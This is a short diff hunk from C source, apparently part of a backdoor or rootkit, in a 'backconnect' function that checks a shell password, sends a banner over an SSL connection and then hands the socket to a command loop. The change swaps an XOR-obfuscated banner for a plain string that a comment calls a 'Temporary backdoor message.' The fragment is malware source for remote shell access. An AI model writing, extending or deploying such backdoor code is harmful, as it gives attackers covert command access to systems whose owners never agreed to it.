@@ -86,9 +86,7 @@ void backconnect(int sock)
         }
         CLEAN(shell_password);
 
-        char *shell_msg = strdup(SHELL_MSG); xor(shell_msg);
-        SSL_write(ssl, shell_msg, strlen(shell_msg));
-        CLEAN(shell_msg);
+        SSL_write(ssl, "Temporary backdoor message.", strlen("Temporary backdoor message.")); // will create a new default message string soon...
 
         cmd_loop(sock);
         close(sock);
